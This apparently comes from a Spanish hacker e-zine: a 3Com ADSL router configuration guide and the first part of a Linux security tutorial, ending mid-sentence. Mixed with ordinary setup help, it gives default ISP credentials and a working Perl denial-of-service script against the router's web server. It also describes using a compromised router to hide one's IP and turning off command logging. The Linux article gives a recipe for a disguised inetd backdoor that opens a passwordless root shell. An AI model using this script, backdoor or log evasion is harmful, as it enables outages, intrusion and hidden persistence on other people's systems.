3Com-DSL>3Com-DSL>Welcome to the OfficeConnect Quick Setup
The OfficeConnect Quick Setup will let you set up LAN-side and global
configuration for your system. To configure wide-area profiles
you should run the OfficeConnect VC Wizard using the QUICKVC command.

Do you want to continue with OfficeConnect Quick Setup?
Tecleamos no ya que vamos a configurar el router manualmente.
Starting line test ...
Selected INNER wires
Vale, lo primero que tenemos que hacer ahora es crear un usuario de administración con su 
contraseña.
Este usuario va a valer para administrar el router de forma remota ya sea por CLI mediante 
telnet o por medio de la interface web. Este usuario no servirá para configurar el router 
mediante consola(puerto serie) ya que para esto se dispone de un usuario distinto. Este punto 
es de vital importancia ya que dejar las contraseñas por defecto es un error de seguridad, ya 
que las contraseñas que pone telefónica son bien conocidas por todos.
3Com-DSL>Add user usuario password contraseña
El siguiente paso es activar la opción para poder configurar el router de forma remota por el 
puerto 23(telnet), esta parte tampoco afecta al modo consola(puerto serie):
Bien, una vez llegados a este punto de la configuración tenemos que decidir que tipo de 
configuración vamos a adoptar si monopuesto o multipuesto. Si tienes un solo host y no quieres 
tener problemas con algunos servicios(msn,irc,...) y no quieres tocar configuraciones, te 
recomendamos esta opción ya que tu host adopta la ip pública y todos los puertos equivalen a 
los puertos de tu ordenador, no a los del router.
Si tienes más de un ordenador conectado al router, no tienes más remedio que coger el modo 
multipuesto, en esta opción es el router el que adopta la ip pública, pero se pueden redirigir 
los puertos que quieras a algunas de las máquinas de la red local. Si quieres tener tu 
configuración en monopuesto pero tienes varios ordenadores, otra opción que tienes es usar un 
ordenador como monopuesto y los demás conectarles a este por red local y usar algún software que
actúe de proxy como el wingate para poder acceder a internet.
Bien, en este artículo explicaremos las dos maneras de configurarlo:

- Monopuesto:
En este modo se asigna la ip pública al único ordenador q tendrá acceso a internet. 
La ip de Lan del router será  (ip pública And mascara)+1, en el ejemplo que vamos a poner 
será 198.160.153.127:
3Com-DSL>Add IP network LAN address 198.160.153.127/255.255.255.224 enable yes
3Com-DSL>Add vc internet
3Com-DSL>set vc internet IP enable ipx disable bridging disable
3Com-DSL>set vc internet network_service rfc_1483
3Com-DSL>set vc internet atm vpi 8 vci 32 category_of_service unspecified pcr 0
Bien, ahora llega la parte para la configuración de la ip de gestión, si no la sabemos, es mejor
 poner una ip privada que no cree conflictos, además así nos evitamos que telefónica tenga 
acceso a la configuración de nuestro router. Además en monopuesto como la ip pública se asigna 
al ordenador, esto no interfiere en le configuración.
En el ejemplo podemos utilizar 172.26.0.0 como ip de gestión para que no haya conflictos:
3Com-DSL>set vc internet remote_ip_address 172.26.0.0/255.255.255.192
3Com-DSL>set vc internet local_ip_address 172.26.0.1
En este paso activaremos la ruta por defecto, y finalmente la conexión: (sin opciones de NAT)
3Com-DSL>set vc internet default_route_option enable
3Com-DSL>enable ip forwarding
3Com-DSL>enable vc internet
3Com-DSL>Save all

Ahora quedaría configurar en el ordenador la ip pública, la puerta de enlace, la máscara y las 
DNS con sus valores apropiados.

- Multipuesto:
En este modo son varios ordenadores los que utilizan el router para conectarse a internet. 
Así que tenemos que configurar una red local con direcciones privadas del mismo rango para el 
router y los distintos ordenadores.
Por ejemplo, pongamos que utilizamos el rango de direcciones privadas 192.168.0.x, ponemos la IP
de Lan del router como la primera, 192.168.0.1.
La máscara 255.255.255.0 nos indica las direcciones que vana  poder usarse en la red local.
3Com-DSL>Add IP network LAN address 192.168.0.1/255.255.255.0 enable yes
Vale, una vez hecho esto, tendríamos que configurar las tarjetas de red de los distintos 
ordenadores de la red local, poniendo las direcciones privadas:192.168.0.2, 192.168.0.3..... 
con máscara 255.255.255.0, puerta de enlace 192.168.0.1 (el router) y DNS 193.152.63.197 que es 
el más común.
Al reiniciar el ordenador comprobamos si hay comunicación entre él y el router, para esto vamos 
a establecer una conexión telnet, si todo sale bien nos saldrá:
Login:
Ponemos el nombre de usuario y contraseña que configuramos anteriormente en el router.
En este momento podemos acceder al router de la manera que queramos, por telnet, por interface 
web o por consola (puerto serie).
Añadimos un Virtual Circuit (vc) o remote site y lo llamamos "internet", esto servirá de enlace 
con la red ATM:
3Com-DSL>Add vc internet
Ahora activaremos los distintos parámetros de conexión(Telefónica):
3Com-DSL>set vc internet IP enable ipx disable bridging disable
3Com-DSL>set vc internet network_service rfc_1483
3Com-DSL>set vc internet atm vpi 8 vci 32 category_of_service unspecified pcr 0
Seguimos:
3Com-DSL>set vc internet remote_ip_address puerta de enlace remota/máscara
3Com-DSL>set vc internet local_ip_address ip pública

Ahí tenemos que sustituir máscara, ip pública y puerta de enlace remota por las nuestras.

Cabe destacar que la puerta de enlace es automática pero cabe la posibilidad de que falle así 
que es mejor ponerla, y se calcula (Ip pública AND máscara)+2.

Ya llegamos a los últimos pasos, que son activar NAT, la ruta por defecto, y finalmente activar 
la conexión:
3Com-DSL>set vc internet nat_option enable
3Com-DSL>set vc internet default_route_option enable
3Com-DSL>enable ip forwarding
3Com-DSL>enable vc internet
3Com-DSL>Save all
Saving..... SAVE ALL
SAVE ALL Complete


--OFRECER SERVICIOS--

Bien, espero que ya os haya quedado claro las ventajas y desventajas de cada modo y la forma de 
configurarlo, en esta sección del artículo vamos a tratar diversos problemas que dan algunos de 
los modos en algún programa de red como irc, ftp, etc.

- Como hacer funcionar un cliente ftp si da problemas.

Este es un error muy común al activar NAT, para solucionarlo tenemos que activar el modo 
PASV(modo pasivo) en el cliente de ftp y así no tendremos ningún problema.

- Como poner un servidor web/ftp:
En el ejemplo vamos a explicar como sería con un servidor web, pero para ftp sería lo mismo 
sólo que variarían los puertos del 80 al 21.
Si tenemos la configuración en monopuesto, el instalar el servidor es muy simple, se instala 
el programa servidor en el ordenador y punto, pero primero hay que tener cuidado y mirar si 
el router tiene filtros o si tenemos un firewall por software que impida las conexiones a estos 
puertos.
Si tenemos el modo multipueso esto es algo más complejo y hay que usar NAPT.
Primero instalamos el servidor en una de las máquinas y vemos que funcione conectándonos a ella 
a través de la red local, una vez comprobado tenemos que redirigir el puerto(80,21..) del router
al ordenador donde está alojado el servidor. De nuevo hay que asegurarse que no exista un filtro 
o un firewall que impida las conexiones a estos puertos.
3Com-DSL>add nat tcp vc internet private_address 192.168.x.x public_port 80 private_port 80
3Com-DSL>save all
Donde 192.168.x.x es la ip privada del ordenador donde está alojado el servidor y 80 es el 
puerto para el servidr web.
En ftp sería igual instalando el servidor de ftp en nuestra máquina:
3Com-DSL>add nat tcp vc internet private_address 192.168.x.x public_port 21 private_port 21
3Com-DSL>save all
Cabe destacar que muchas veces para que esto haga efecto hay que reiniciar el router.

- DCC´s en el irc

El problema de esto es que si alguien te hace un dcc si que funcionará ya que es la otra la 
persona la que actúa de servidor abriendo el puerto 59 de su máquina y tu actuas de cliente. 
Pero si eres tú el que haces un dcc no te funcionará en modo multipuesto ya que eres tú el que 
abres tu puerto y actúas de servidor, entonces para que esto funcione tienes que volver a 
configurar NAPT:
3Com-DSL>add nat tcp vc internet private_address 192.168.x.x public_port 59 private_port 59
3Com-DSL>save all
Y puede ser posible que haya que reiniciar también si ves que no funciona.


--SEGURIDAD-

En este apartado vamos a hablar tanto de las formas de defender como de atacar este tipo de 
dispositivos.

-Filtros:

Estos routers tienen la opción de aplicar unos filtros sobre una serie de puertos y de rangos 
de ips.
Telefónica entrega los routers bloqueados con uno o dos filtros cuando vienen configurados en
 multipuesto, que impiden el acceso a los puertos 23 y 80 del router desde cualquier dirección 
de internet o incluso desde la red local, y permiten el acceso a estos puertos desde las 
direcciones de gestión de los técnicos de telefónica.
Telefónica instala dos filtros, el primero impide las conexiones externas a los puertos 23 y 80 
de configuración del router, y el segundo filtro impide la entrada desde la red local, es decir 
al propio usuario.
Así es como lo hacen para configurarlo:
3Com-DSL>capture text_file filtro
ÿÿÿÿÿÿÿÿ#filter
IP:
1 ACCEPT src-addr=193.152.37.192/28;
2 REJECT tcp-dst-port=23;
3 REJECT tcp-dst-port=80;
3Com-DSL>add filter filtro


La única forma de poder entrar al router como dijimos antes es a través del puerto serie. 
EL problema de seguridad de esto es que muchos usuarios newbies quitan los filtros al leer una 
serie de manuales en internet sin saber las consecuencias que puede acarrear. Al quitar estos 
filtros dejan abiertos los puertos de configuración, y si no han cambiado la clave por defecto 
de telefónica(adminttd:adminttd) cualquier persona que conociese la ip pública podría acceder 
al router con sus consecuencias y si el usuario cambió las contraseñas, se podría llevar a cabo 
un ataque de fuerza bruta, aunque esto sería un poco más complejo.

Bien, para defender el router contra ataques podemos hacer varias cosas. Si tenemos el router 
en modo monopuesto esto no nos afecta ya que los puertos del router no son accesibles, ya que 
son los del ordenador. En modo multipuesto es conveniente poner algunos filtros. Si quieres 
mantener los filtros pero no quieres que las ip´s de gestión puedan acceder a tu router ya que 
cualquier atacante podría llevar a cabo un ataque de ip-spoofing, es decir falsear su ip 
haciéndose pasar por una ip de gestión y entrar en el router. Para quitar estos filtros podemos 
borrar los filtros actuales o bien modificarlos:
3Com-DSL>list filters
Muestra la lista de filtros activa, para ver el contenido de uno de los filtros:
3Com-DSL>show filter filtro
3Com-DSL>delete filter filtro

Para eliminar el filtro que queramos, si queremos conservar los filtros pero sin las ips de 
gestión:
3Com-DSL>capture text_file filtro
ÿÿÿÿÿÿÿÿ#filter
IP:
1 REJECT tcp-dst-port=23;
2 REJECT tcp-dst-port=80;
3Com-DSL>add filter filtro
Esto después de haber borrado los correspondientes filtros.

- Agujeros de seguridad:

Estos dispositivos tienen un bug bien conocido por todos que hace que el router se resetee (D.o.S).

El servidor web cuando intentas acceder a alguna des sus partes te pide el nombre de usuario y
 contraseña de administrador del router. Pero existe una imagen GIF que no te pide esta 
identificación.
http:///graphics/sml3com
Cuando haces una petición a esa URL ves la imagen Gif. Pero si añades una cadena de gran longitud:
http://xxx.xxx.xxx.xxx/graphics/sml3com%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%
s%s%s%s%s%s%s%s%s%%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s

El router se reseetea.

Otro agujero de seguridad que se encontró fue que las opciones para resetear el router desde el 
modo web tampoco requerían identificación:
http://192.168.1.254/adsl_pair_select
http://192.168.1.254/adsl_reset

Con lo que haciendo una petición de eso tipo también hacemos un reset al router.
Aquí os pongo el código fuente hecho por mi para usar este ataque, para los vagos :) :

use IO::Socket;
$server = $ARGV[0];

$remote = IO::Socket::INET->new(Proto=>"tcp",
                                 PeerAddr=>$server,
                                 PeerPort=>"80",
                                 Reuse=>1)
                          or die "No se pudo conectar a $server";
print $remote "GET /graphics/sml3com%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%
s%s%s%s%s%s%s%s%s%%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s http/1.0\n\n";
while(<$remote>) {print}
close $remote;

Se usa de la siguiente manera:
pinoch0#perl 3comdos.pl 127.0.0.1



--COMANDOS INTERESANTES-

Como atacantes, al acceder al router tenemos a nuestra disposición algunas herramientas 
interesantes, lo primero es que podemos utiliza el router como pasarela para ocultar nuestra ip 
a través del comando telnet:
3Com-DSL>telnet ip puerto
Con esto lo que hacemos es utilizar la ip del router para conectarnos a un servicio remoto.
Este router tiene un pequeño sistema de logs que guarda los comandos tecleados en el CLI, pero 
es fácilmente desactibable mediante el comando:
3Com-DSL>set command history 1


                                             By pinoch0
                                         pinoch0@hotmail.com

                        Las reglas y los modelos destruyen el genio y el arte




                  ***************************************************************
                  ***************************** 6 *******************************
                  ******************** Seguridad en linux (I) *******************
                  *************************** _TyR ******************************
                  ***************************************************************


		
Bueno, mi nick es _TyR, y pienso escribir una serie de articulos sobre el tema que más me 
interesa,linux, centrandome en especial en la seguridad del sistema. En este primer articulo
voy a tratar los siguientes temas:
-----------------------------------------------------------------------------							
temas---|Archivos-----------------------|/etc/passwd** 
	|				|
	|MD5**				|/etc/group** 
	|				|
	|Algo de criptografía**		|/etc/shadow**
	|				|
	|Tcp_wrappers**			|/etc/gshadow**
	|
	|Inetd y xinetd**
	|
	|Control de una red**
	|
	|puertos**
-----------------------------------------------------------------------------
Dejando para los siguientes articulos el uso de Netfilter, logs , protocolos y la
defensa contra algunos ataques como el Spoofing ip , TCP Syn flooding , ping de la muerte...,
y como configurar servidores tales como el ftp y web de forma segura. Recomiendo que
este primer articulo quede claro, ya que en posteriores articulos usaré las cosas 
aprendidas aquí.

*********************************************************************************************
*********************************************************************************************

ARCHIVOS
-------
En el tema de la seguridad me voy a centrar en unos cuantos archivos:

* ---->/etc/shadow -----> Al instalar el shadow password , nos creará este fichero , en el 
cual se coje la del /etc/passwd la parte que corresponde a los passwords de los
usuarios, dejando en este último fichero una x en el lugar donde estaba el
password encriptado.
Es recomendable , que los passwords sean de unos 6 a ... digitos y contengan numeros,
letras y algun simbolo , para que en caso de que algun desconocido consiguiera este
fichero le costara sudor y lágrimas averiguar los passwords :). 
Para comprobar que tal de complejos son nuestros passwords , usaremos la herramienta
John the ripper. Para los que no conozcan a nuestro amigo John , yo se lo presento:
John the ripper es una herramienta que nos sirve para crackear los passwd en UNIX ,
hay versiones en muchas plataformas (UNIX , dos , win). Este programa ca creando combinaciones
de caracteres , los encripta y compara con la clave encriptada que hay en el /etc/passwd.
Si ves que el john consigue averiguar tu password en un periodo de 1 hora a 4 horas
tu contraseña no es muy segura , en cambio si ves que tras un par de dias no lo consigue
tu password tendrá una seguridad mas o menos elevada :).




Ejemplo de linea de /etc/shadow :

root:pk2IuEe4YjnWs:11878:0:99999:7:::

Bueno, lo primero que nos muestra es el nombre del usuario, en este caso es el root,
después nos viene el password de root encriptado. Para intentar averiguar este password
necesitamos poner esa linea entera en un archivo , y despuse poner en una shell
john archivo , para que empiece ha hacer pruebas. Podeis probar con ese mismo , jeje a ver quien
lo saca.

* ---->/etc/passwd ------> Este fichero lo voy a explicar poniendo una linea de dicho archivo:
			    
			    root:x:0:0:root:/root:/bin/bash
			    ---- - - - ---- ----- ---------
			    1	 2 3 4  5     6       7
			    
Bueno , aqui teneis una linea del /etc/passwd.

*El primer elemento (root) es el nombre de usuario.
*En este sistema como se estan usando shadow passwords el paswrod no aparece encriptado
en el /etc/passwd , en su lugar aparece una x, por lo tanto el segundo elemento,
corresponde al lugar donde debería ir el password encriptado de root.	 			
* El tercero (0) representa el número de usuario de sistema , tambien conocido como
UID. El UID 0 indica que el usuario tiene nivel de root.
*El numero 4 representa el GID (Numero de al grupo que pertenece el usuario). El 0 corresponde
al grupo del root. Los usuarios del mismo grupo tienen los mismo privilegios
(más tarde explicare lgo de privilegios y grupos).
* /root ---> Representa el directorio de la home del usuario, el directorio de "trabajo".
Para los usuarios suele estar en /home/user.
* La última parte de esta linea nos informa del interprete de comandos del usuario.
Bueno aquí concluyo con la explicación del /etc/passwd.


-----------------------------------------------------------------------------------------

ALGO DE CRIPTOGRAFÍA
---------------------
Nada mas entrar en un sistema UNIX , la primera pantalla que te sale, después de cargar el 
sistema, es la de introducir login y password. Al introducir el password el sistema lo encripta 
y lo compara con el que se encuentra en el /etc/passwd o el /etc/shadow, en caso de la palagra 
que introduciste como password sea igual (encriptada) a la linea de uno de estos dos ficheros, 
el sistema admitirá el password como válido , en caso contrario te saldrá en la pantalla el 
mensage de login incorrect ;).

Unix emplea un mecanismo de encriptacion llamado crypt(3). El crypt(3) es un mecanismo de
encriptacion que posee el kernel y está basado en el DES (estandar de encriptacion de datos)

Primero la combinacion de caracteres que introduciste como password es encriptada en
una secuencia de ceros, después de hacer eso el resultado de la encriptacion es nuevamente
encriptado con el password que introducimos como clave. Este proceso se repetirá 25 veces.
Cuando acaba el proceso anterior los 64 bits se dividien en 11 caracteres y el resultado
se guarda en el /etc/passwd o el /etc/shadow. Ademas de el proceso anteriormente contado
se utiliza un metodo conocido como grano de sal, que se trata de un valor de 12 bits que
el cual se utiliza para modificar el resultado que ya teniamos.
Con todo esto, tenemos que para un mismo password pueden haber 4096 formas posibles.

------------------------------------------------------------------------------------------

* ----> /etc/groups y /etc/gshadow---> Un usuario puede pertenecer a uno o varios grupos.
Cada grupo tiene un nivel de permisos sobre alguna parte del sistema. En estos dos archivos 
se encuentra informacion sobre los grupos del sistema y los users que pertenecen a ellos.

PERMISOS
--------
En linux se puede llegar a tener todos los usuarios que uno quiera, por eso se dice que es un 
sistema multiusuario :), por ello es necesario crear unas ciertas barreras ante usuarios
menos expertos o simplemente por que un admin no quiere que nadie acceda a unos determinados
ficheros. Esto permite que entre otras cosas un usuario normal no pueda borrar
por ejemplo los archivos de otro user (Si fuera así en la realidad no habría tantas peleas :P)
y así se evitan problemas. El root tiene acceso a todo jeje por algo es el superusuario.
Pero lo normal es que entre usuarios los archivos se puedan leer , aunque no modificar
ni por supuesto borrar.
Cada fichero tiene un dueño determinado y unos permisos.
Esto nos lleva a la conclusion de que cada individuo puede decidir sobre los permisos
de ficheros creados por el mismo , aunque tambien podrian acceder a esos ficheros
los miembros de un mismo grupo.


Se distinguen tres tipos de permiso, el de escritura , ejecución y lectura. El permiso
de lectura permite al usuaario poder ver el contenido de un archivo o en el caso
de un directorio ver los documentos y carpetas contenidas en el mismo. El de escritura
permite crear nuevos  archivos o borrar los existentes, y el de ejecucion ejecutar un programa
(esto es un poco de perogrullo xDD). Los permisos se pueden dar a tres tipos de usuarios
el root o superusuario , el grupo y el creador del archivo.

Vamos a mostrar unos cuantos ejemplos para poder interpretar los permisos de ficheros:
Aunque primero voy a decir el significado de unas cuantas "letras" xDD:
r ----> viene de read , viene a ser permisos de lectura jeje.
w ----> viene de write , supongo que sabreis que significa de escritura.
x ----> viene de Execute, permisos de ejecución.

El primero de los caracteres que nos sale en una linea de permisos puede tener uno de los 
siguientes caracteres:
- ----> Un archivo comun
l ----> Links , el archivo es un enlace.
d ----> Directory, el archivos es un directorio.
b ----> Block devices, como el /dev/scd0
c ----> Dispositivo de modo caracter.
s ----> Socket.
Conviene aclarar que al ver una linea con los permisos de un archivo , se ordena de la
siguiente manera:
-rwxrwxrwx  |	1 --> Tipo de archivo.
^---	    |	2 --> Los permisos del propietario.
1 ^ ---	    |   3 --> Los permisos de los grupos.
  2  ^ ---  |	4 --> Los permisos de los demas users.
     3  ^   |
        4   |	
	
Bueno ahora que conocemos el significado de estas letras y el orden en el que
se disponen ya va siendo hora de que ponga los ejemplos jeje:

-rwxr-xr-x   1 tecnet   tecnet       8771 nov 11  2001 sysinfo.pl ---> Este fichero 
tendría permisos de lectura , escritura y ejecución para el
root , para los grupos y el resto de usuarios de ejecucion y lectura.

-rw-r--r--    1 root     tecnet       6121 jul  8 20:03 ipt ---> Este fichero
tendría permisos de lectura y escritura para el root y de lectura para el resto
de los users.

Tambien es combeniente saber que los permisos de un fichero dependen tambien
de los permisos del directorio en el que se encuentren, si un archivo tiene permisos
de todo tipo para todo el mundo , sería inutil si el directorio en el que se encuentra
no pueden acceder los users.

Bueno, espués de hablar tanto sobre permisos nos convendría saber como modificarlos verdad ?
pues vamos a ello, para esto usaremos el comando chmod. Solo podrá cambiar los permisos
de un archivo el propietario del fichero o alguien que tenga mas permisos que este.
La sintaxis del comando es la siguiente:
	chmod {a,u,g,o} {+,-} {r,w,x} fichero1 fichero2 ... ficheroN (Datos extraidos del man xDD)
	      ----------------------
	    		^
	Estro vendria a ser una represencion simbolica de los permisos
			    
Este comando cambia los permisos de un fichero , dependiendo del modo que le pongamos,
el modo puede ser o bien una representacion simbolica de los permisos o tambien un numero
octal que represente el patron de bits de los nuevos permisos.

Los elementos del primer corche nos indican a quien le queremos dar los permisos:
a ---> Todo el mundo.
u ---> Usuarios.
g ---> Grupo.
o ---> Otros.

El mas y el menos del segundo corchete indica si añadimos permisos a los existentes en
el caso del mas (+) y si se los sustraemos (-).
por ultimo el que contiene los tipos de permisos , supongo que eso ya se conocera :).

Ahora un poco de la representacion con un número octal:

Como ya dijimos, los permisos se pueden modificar con una representacion simbolica o con un
numero octal de uno a cuatro digitos.En este caso usaremos 3 solo.
El primero de los tres digitos representa los permisos del propietario, el siguiente del grupo 
y el ultimo de otros.
Permiso de lectura (r) = 4 
Permiso de escritura (w) = 2 
Permiso de ejecución (x) = 1 
Cuando el permiso está desactivado (-) = 0
Pongamos un ejemplo de como se utiliza:

Supongamos que queremos darle a un fichero los siguientes permisos :

-rwxr-xr-x 

Pues para darselos del modo numerico, tendremos que separar de tres en tres sin contar el primer
caracter, de modo que quedaría así:
-  rwx r-x r-x   
   --- --- ---   
    a   b   c
		   
   |r = 4 |		
a= |w = 2 |--->7  
   |x = 1 |
                    Por lo tanto para darle esos permisos a un fichero    
   |r = 4 |	    tendriamos que poner chmod 755 archivo . Sencillo no ?
b= |- = 0 |--->5    
   |x = 1 |

   |r = 4 |
c= |- = 0 |--->5
   |x = 1 |




INETD Y XINETD
--------------
Estos Superdemonios sirven para controlar las conexiones de red en un ordenador.
En inetd cuando se detecta un intento de conexion al pc, este se redirije a un programa
conocido como tcpd.
*tcpd ---> Demonio que puede monitorizar y filtrar peticiones entrantes para diversos
*servicios tales como finger , ftp, ssh y muchos algunos más. Tcpd anota los intentos en un log.
Tcpd , dependiendo de las reglas contenidas en el host.allow y el host.deny, (ambos archivos se encuentran en /etc/ ), 
** La estructura de una linea de estos ficheros es la siguiente:
ALL: LOCAL: ALLOW	| 1º ---> Demonio , en este caso se refiere a  todos.
---  ----  -------   	| 2º ---> Host, aparte de la ip se pueden 
 1     2      3       	| poner las siguientes opciones.  | ALL ---> Todas las conexiones.
							  | LOCAL -> Conexiones que no contienen un punto.
							  | PARANOID > Máquinas que no coincide el nombre con la ip.
							  | KNOWN ---> Conexiones de las cuales se conoce el nombre y la ip.
							  | UNKNOWN -> Conexiones de las cuales se desconoce el nombre o la ip.

 		        | 3º ---> Posibles opciones . |ALLOW ---> Acepta.
						      |DENY ----> Deniega.
						      |TWIST ---> Ejecuta un comando, pero no establece
						      |la conexion.
						      |SPAWN ---> Una vez establecida la conexion,
						      |esta opcion ejecuta un comando en la shell
						      | ** Para TWIST y SPAWN , podemos poner unos parametros que nos ayuden
						      | a completar los comandos que pongamos para qu se ejecuten en la shell.Serian:
						      | %a ---> Nos pondria el nombre de la máquina que intenta acceder a nuestro pc
						      | %d ---> El demonio que esta utilizando.
						      | %p ---> El PID del proceso que esta usando.
							
acepta o deniega la conexion. Si la peticion se acepta se iniciara el servicio 
correspondiente. Este mecanismo se denomina tcp_wrapper.

EJEMPLOS
--------
En el /etc/host.deny :  

ALL: ALL	|---> Deniega todas las conexiones a todos los servicios. 

ALL: ALL except 195.125.24.1  |----> Este ejemplo realiza la misma funcion del anterior,
			      | unicamente que aceptara solamente las conexiones a todos
			      | los servicios de 194.125.24.1.

proftpd: ALL	|---> Deniega todas las conexiones al servicio ftp.

			     
ALL: ALL TWIST  |---> No deja establecer la conexion a nadie , pero poniendo TWIST, podemos
		| ejecutar un comando.

ALL: ALL TWIST  (/bin/echo -e " Intento de conexion de %n a traves del demonio %a " >> /var/log/conexiones &)
------------------------------------------------------------------------------------------------------------
      |-> Este Comando nos rechaza todas las conexiones, pero crea un log
      | en /var/log/conexiones con todos los intentos de conexion, mostrandonos
      | una linea en la que nos muestra la ip y el demonio que utiliza.

En el /etc/host.allow:

ALL: ALL	|---> Acepta todas las conexiones.

ALL: ALL except 195.125.24.1 |-> Acepta todas las conexiones salvo la de 194.125.24.1.

telnetd: ALL SPAWN (/bin/echo -e " Ha entrado al telnet %a " >> /var/log/conexiones &)
--------------------------------------------------------------------------------------
       |-> Este comando Acepta todas las conexiones a traves de telnet y las logea
       | en /var/log/conexiones dandonos la ip.

sshd: 195.125.15.4 , 182.47.14.89 |----> Acepta las conexiones por ssh de 195.125.15.4 y 
				  | 182.47.14.89 .    


Buen ahora voy a tratar un poco la configuracion de inetd.
Para ello tendriamos que modificar el archivo inetd.conf que se encuentra en nuestro
directorio /etc.

Bueno , para cerrar un servicio en el inetd, unicamente tienes que comenlar la linea del servicio, 
como en este caso:
# echo		stream	tcp	nowait	root	internal
Una vez comentada la linea se debe de reiniciar el demonio , nada de reiniciar el pc ,
lo digo para aquellos que viven con la mentalidad anclada en windows :). Para reinciar el 
demonio lo unico que teneis que hacer es /etc/init.d/inetd restart:
tecnet:/etc# /etc/init.d/inetd restart
Restarting internet superserver: inetd.
tecnet:/etc#
Ahora voy a comentar un poco la estructura de una frase del inetd.conf
time           stream  tcp     nowait  root    internal
----	       ------  ---     ------  ----    -------- 	
 1		2	3	4	5	   6

1º ----> Nombre del servicio.Se buscará en /etc/services , para ver a que puerto corresponde.
Ex de una linea del /etc/services:
ftp             21/tcp  | La primera parte nos indica el nombre del servicio, después
			| nos dice el puerto que usará y el protocolo.
			| En este ejemplo se habla del servicio ftp , que corresponden
			| al puerto 21 de la maquina y va por el protocolo tcp.
			
2º ----> Tipo de socket --> Pueden ser de estos tipos en este fichero de configuracion(con esto 
quiero decir que hay más aparte de estos, pero no tienen que ver con el inet.conf).
Sockets Stream ---> Son los más usados , hacen uso del protocolo tcp.
Sockets Dgram (datagram) --> Hacen uso del protocolo UDP.
Sockets Raw --> Son los menos comunes, se suelen usar para desarrolar nuevos protocolos de comunicacion
Sockets rdm
Sockets seqpacket 

3º ---> El protocolo, puede ser uno de los que hay en /etc/protocols.
4º wait/nowait ---> Esta parte será siempre nowait , salvo cuando el tipo de socket
es dgram, que puede tener wait si es mono hebra o nowait si es multi hebra.
5º El usuario --> El nombre del usuario por el cual correra el proceso.
6º Server path y argumentos ---> Aqui se indica la direccion del demonio (Internal quiere
decir que el servicio se encuentra dentro del mismo inetd).

El inetd , cuando linux está recien instalado deja algunos servicios abiertos , que no nos 
sirven para nada , solo para aportar informacion a posibles atacantes por ello es conveniente 
que los cerremos. Para ello nos vamos al /etc/inetd.conf y comentamos servicios como :

#:INTERNAL: Internal services
#echo           stream  tcp     nowait  root    internal
#echo           dgram   udp     wait    root    internal
#chargen        stream  tcp     nowait  root    internal
#chargen        dgram   udp     wait    root    internal
#discard        stream  tcp     nowait  root    internal
#discard        dgram   udp     wait    root    internal
#daytime        stream  tcp     nowait  root    internal
#daytime        dgram   udp     wait    root    internal
#time           stream  tcp     nowait  root    internal
#time           dgram   udp     wait    root    internal
no nos sirve ninguno , por eso los tengo comentados y los de talk y ntalk , pues si lo vais a 
usar lo dejais si no lo comentais tb.


Bueno , después de saber esto , la gente más "avispada" se habrá dado cuenta de que
se podría hacer una especie de "troyano" (digo la gente más avispada, ya que la gente
con más conocimientos no se habrá dado cuenta , lo sabrá ;) ) usando el /etc/services
y el /etc/inetd.conf .
Claro , si nosotros declararamos un servicio en /etc/services , y después, usamos en el
inetd.conf ese servicio y en el lugar de especificarle el demonio le espeficamos una
ruta a una shell , podremos acceder a esa shell , sin necesidad de ningún password.
Voy a explicar los pasos con ejemplos:
Nosotros tenemos una linea en el /etc/services :
ftp             21/tcp

Solo tendriamos que imitarla poniendo algún puerto que no se use , por ejemplo el 8 (Se
podría poner cualquiera que no estuviera en el services), y ademas le tenemos que dar
un nombre al servicio , no es recomendable que se le den nombres que tengan algo que ver
con el usu que le vamos a dar o puedan dar alguna pista , por ejmplo puerto_backdor o troyano xD,
tendriamos que darle un nombre, que algun novato se lo pueda tomar como un servicio mas y les 
parezca algo serio como por ejmplo userd o algo como tsystem jeje , nos vamos a quedar con 
tsystem, dejariamos una linea similar a esta:

tsystem		8/tcp

Después tendriamos que ir a por el inetd.conf y darle forma a una regla que nos pueda
servir para que nos cree una shell cada vez que hagamos telnet a ese puerto, sería algo
parecido a esto:

tsystem		stream/tcp nowait root /bin/bash 

Esto da el servicio y al hacer telnet ip 8 , nos daría acceso a una shell como root sin
necesidad de password. (Claro está que cuando hacemos una modificacion en el inetd.conf
debemos reinciar inetd para que podamos usar los cambios).
Claro que para poner estos cambios necesitas ser root y no conozco a nadie que pueda
ser tan &%$** como para hacer eso.

Ahora voy a hablar de xinetd.
------------------------------

Xinetd tiene unas funciones bastante parecidas a las de inetd y tcpd , pero se pueden
hacer muchas mas cosas, y tiene una estructura que puede resultar más "amgigable", por
lo menos para mi jeje.

El fichero de configuracion de xinetd se encuentra en /etc/xinetd.conf , y para cada
servicio existe una sección pudiendo definir en cada seccion bastantes opciones
sobre el servicio. La primera seccion de xinetd es defaults, las opciones que pongamos
en esta seccion se definen las opciones por defecto que tendran el resto de las secciones.
estructura:
defaults
{
atributos
}

Una seccion de xinetd dedicada a un servicio tiene la siguiente estrructura :

service nombre_del_servicio
{
atributos
}

Se ponen mas o menos los mismo datos , voy a seguir el mismo orden que seguiria una
linea del inetd.conf:

service ftp        ## Nombre del servicio , que debe estar en /etc/services.
{
socket_type = stream     ## Tipo de socket , de momento tiene una estructura muy parecida a la del inetd.conf
wait = no		
server = /usr/sbin/proftpd  ## El lugar donde está el daemon.
}
## Hasta aquí ha sido todo bastante parecido a la config del inetd, pero en el xinetd nosotros podemos definir opciones que para definirlas en el
## inetd , necesitariamos hacer uso del /etc/hosts.allow y /etc/host.deny. Vamos a ver algunas de ellas.
* only_from Pueden ser ips , nombre de hosts etc , es una lista con los clientes que pueden acceder al servicio.
* no_acces Los clientes que no pueden acceder al servicio.
* protocol El protocolo , que debe de estar en /etc/protocols , como en inetd.
* port El puerto que usa el servicio.
Tambien se puede especificar unas horas determinadas para ver cuando el servicio
esta activo con el comando access_times.
* instances Nos indica la cantidad de clientes del mismo tipo que pueden conectarse a la vez por ese servicio.
Y otras muchas funciones que se podrían añadir.
Vamos a poner un ejemplo :
Supongamos que queremos tener nuestro servidor ftp (usando protfpd)  abierto solo por la tarde , concretamente
de 5 de la tarde a 9 de la noche(17:00-21:00) no queremos que entren a la vez mas de 5 usuarios,
y tegan solo acceso los clientes con un rango de ips entre 182.52.13.0/32 salvo el
